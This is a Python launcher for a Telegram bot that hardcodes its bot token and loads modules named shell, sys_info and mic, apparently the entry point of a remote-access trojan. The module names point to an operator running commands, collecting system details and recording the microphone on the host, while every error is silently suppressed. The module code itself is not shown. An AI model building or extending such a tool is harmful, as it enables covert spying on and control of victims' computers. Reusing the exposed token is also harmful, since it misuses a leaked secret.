import asyncio
from aiogram import Dispatcher, types
from aiogram import Bot
from helpers import shell, sys_info, handlers, mic

bot_token = '6949521925:AAHX4ft4jRx-PrQdgcD20wZWVbwQfV5YyxI'
bot = Bot(token=bot_token, parse_mode="HTML")

dp = Dispatcher()

dp.include_router(handlers.router)
dp.include_router(sys_info.router)
dp.include_router(shell.router)
dp.include_router(mic.router)

@dp.errors()
async def errors_handler(update: types.Update, exception: Exception):
    pass

async def main():
    try:
        await dp.start_polling(bot)
    except (KeyboardInterrupt, SystemExit):
        pass
    finally:
        await bot.session.close()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        pass